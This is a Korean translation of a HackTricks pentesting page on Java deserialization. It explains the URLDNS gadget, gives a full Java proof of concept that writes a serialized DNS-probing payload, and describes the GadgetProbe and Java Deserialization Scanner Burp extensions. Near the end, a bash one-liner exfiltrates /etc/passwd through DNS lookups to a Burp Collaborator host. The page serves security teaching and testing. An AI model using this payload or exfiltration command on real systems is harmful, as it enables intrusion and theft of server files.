# Java DNS 역직렬화, GadgetProbe 및 Java 역직렬화 스캐너

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 역직렬화에서 DNS 요청

`java.net.URL` 클래스는 `Serializable`을 구현합니다. 이는 해당 클래스가 직렬화될 수 있다는 것을 의미합니다.
```java
public final class URL implements java.io.Serializable {
```
이 클래스는 **흥미로운 동작**을 가지고 있습니다. 문서에서는 "두 호스트 이름이 동일한 IP 주소로 해석될 수 있다면 두 호스트는 동등하게 간주됩니다"라고 설명하고 있습니다.\
그러므로 URL 객체가 **`equals`** 또는 **`hashCode`** 함수 중 **어떤 함수를 호출하든** IP 주소를 얻기 위해 **DNS 요청**이 전송됩니다.

URL 객체에서 **`hashCode`** 함수를 호출하는 것은 매우 간단합니다. 이 객체를 직렬화할 `HashMap`에 삽입하기만 하면 됩니다. 이는 `HashMap`의 **`readObject`** 함수의 끝에서 다음 코드가 실행되기 때문입니다:
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
다음은 `HashMap` 내의 모든 값과 함께 `putVal`을 **실행**할 것입니다. 그러나 더 중요한 것은 각 값과 함께 `hash`를 호출하는 것입니다. 다음은 `hash` 함수의 코드입니다:
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
관찰할 수 있듯이, **직렬화**할 때 **`HashMap`**을 **역직렬화**하는 경우, 함수 `hash`는 **각 객체와 함께 실행**될 것이며 **`hash`** 실행 중에는 객체의 `.hashCode()`가 실행됩니다. 따라서, **URL** 객체를 포함하는 **`HashMap`**을 **역직렬화**하면 **URL 객체**가 `.hashCode()`를 **실행**합니다.

이제, `URLObject.hashCode()` 코드를 살펴보겠습니다:
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
다음과 같이 `URLObject`가 `.hashCode()`를 실행하면 `hashCode(this)`라고 불립니다. 계속해서 이 함수의 코드를 볼 수 있습니다:
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
도메인으로 `getHostAddress`가 실행되어 **DNS 쿼리가 시작**됨을 알 수 있습니다.

따라서, 이 클래스는 **시리얼화**가 가능하다는 것을 **증명**하기 위해 **DNS 쿼리를 실행**하거나, 심지어 **정보를 유출**하기 위해 남용될 수 있습니다 (명령 실행의 출력을 하위 도메인으로 추가할 수 있습니다).

### URLDNS 페이로드 코드 예제

[여기에서 ysoserial의 URLDNS 페이로드 코드를 찾을 수 있습니다](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java). 그러나, 이해하기 쉽게 코드를 작성하는 방법을 설명하기 위해 ysoserial의 코드를 기반으로 나만의 PoC를 만들었습니다.
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### 추가 정보

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* 원래 아이디어에서는 commons collections 페이로드를 변경하여 DNS 쿼리를 수행했습니다. 이 방법은 제안된 방법보다 신뢰성이 떨어집니다. 하지만 이는 다음 게시물입니다: [https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

[**GadgetProbe**](https://github.com/BishopFox/GadgetProbe)를 Burp Suite 앱 스토어(Extender)에서 다운로드할 수 있습니다.

**GadgetProbe**는 서버의 Java 클래스에 어떤 **Java 클래스가 존재하는지** 알아보기 위해 **이전 섹션의 DNS 페이로드**를 사용합니다. DNS 쿼리를 실행하기 **전에 임의의 클래스를 역직렬화**하려고 시도합니다. **임의의 클래스가 존재한다면**, **DNS 쿼리**가 **전송**되고 GadgetProbe는 이 클래스가 존재한다는 것을 알립니다. **DNS** 요청이 **전송되지 않는다면**, 이는 **임의의 클래스가 성공적으로 역직렬화되지 않았다는 것**을 의미합니다. 따라서 해당 클래스가 존재하지 않거나 **직렬화/악용 가능성이 없습니다**.

Github 내부에는 [**GadgetProbe에 대한 일부 단어 목록**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists)이 있습니다.

![https://github.com/BishopFox/GadgetProbe/blob/master/assets/intruder4.gif](<../../.gitbook/assets/intruder4 (1) (1) (1).gif>)

### 추가 정보

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Java Deserialization Scanner

이 스캐너는 Burp App Store(Extender)에서 **다운로드**할 수 있습니다.\
이 **확장 프로그램**에는 **수동** 및 **능동 기능**이 있습니다.

### 수동

기본적으로 모든 요청과 응답을 **수동으로 확인**하여 **Java 직렬화 마법 바이트**를 찾고 발견된 경우 취약성 경고를 표시합니다:

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/image (290).png>)

### 능동

**수동 테스트**

요청을 선택하고 마우스 오른쪽 버튼을 클릭하여 `Send request to DS - Manual Testing`을 선택할 수 있습니다.\
그런 다음, _Deserialization Scanner Tab_ --> _Manual testing tab_에서 **삽입 지점**을 선택하고 테스트를 시작할 수 있습니다(사용된 인코딩에 따라 적절한 공격을 선택합니다).

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../.gitbook/assets/3-1.png)

이 "수동 테스트"라고 불리는 것은 꽤 **자동화**되어 있습니다. 웹 서버에 있는 라이브러리를 확인하여 **직렬화**가 **어떤 ysoserial 페이로드에 취약한지** 자동으로 확인하고 취약한 라이브러리를 강조합니다. **취약한 라이브러리를 확인**하기 위해 **Javas Sleeps**, **CPU** 소비를 통한 **sleeps**, 또는 이전에 언급된 **DNS**를 사용하여 실행할 수 있습니다.

**악용**

취약한 라이브러리를 식별한 후 요청을 _Exploiting Tab_으로 보낼 수 있습니다.\
이 탭에서 다시 **삽입 지점**을 선택하고, **생성할 취약한 라이브러리**와 **명령**을 작성한 다음 적절한 **Attack** 버튼을 누르기만 하면 됩니다.

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/4 (1).png>)

### Java Deserialization DNS Exfil 정보

페이로드를 실행하도록 다음과 같이 작성하세요:
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### 자세한 정보

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
